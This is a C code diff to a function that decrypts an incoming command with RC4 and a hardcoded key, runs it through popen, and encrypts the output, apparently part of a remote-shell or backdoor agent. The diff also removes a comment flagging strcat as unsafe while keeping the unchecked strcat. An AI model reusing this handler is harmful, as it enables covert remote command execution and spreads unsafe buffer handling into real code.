@@ -48,15 +48,15 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
     char *buffer;
     char *command;
     size_t temp_buffer_size;
-    unsigned char *temp_buffer = (unsigned char *) calloc(BUFFER_SIZE, 1);
+    unsigned char *temp_buffer = (unsigned char *) calloc(BUFFER_SIZE + 6, 1); // added 6 to prevent overflow
     CHECK_ALLOC(temp_buffer);
 
     data[strlen((char *) data) - 1] = '\0'; // strip the newline
 
     // decrypt the command
-    RC4(data, strlen((char *) data), (unsigned char *) KEY, KEY_LENGTH, temp_buffer);
+    rc4(data, strlen((char *) data), (unsigned char *) KEY, KEY_LENGTH, temp_buffer);
 
-    command = strcat((char *) temp_buffer, " 2>&1"); // redirect stderr to stdout // strcat needs to be changed not safe
+    command = strcat((char *) temp_buffer, " 2>&1"); // redirect stderr to stdout
 
     ptr = popen(command, "r");
     if (ptr == NULL) {
@@ -73,7 +73,7 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
     memmove(buffer, (char *) temp_buffer, temp_buffer_size);
 
     // encrypt the output
-    RC4((unsigned char *) buffer, temp_buffer_size, (unsigned char *) KEY, KEY_LENGTH, output);
+    rc4((unsigned char *) buffer, temp_buffer_size, (unsigned char *) KEY, KEY_LENGTH, output);
 
     free(temp_buffer);
     free(buffer);
